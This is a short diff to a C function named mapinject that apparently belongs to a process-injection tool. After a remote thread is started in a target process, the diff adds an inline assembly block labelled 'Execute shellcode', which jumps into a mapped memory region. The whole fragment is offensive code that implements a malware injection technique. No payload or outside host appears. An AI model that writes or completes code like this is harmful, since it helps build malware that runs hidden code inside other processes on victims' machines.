@@ -58,6 +58,14 @@ int mapinject(int targetProcess)
     }
     printf("\nRemote Thread Started!\n");
 
+    // Execute shellcode
+    __asm
+    {
+        mov eax, lpMapAddress
+        push eax;
+        ret
+    }
+
     // Clean up resources
     UnmapViewOfFile(lpMapAddress);
     CloseHandle(hFileMap);
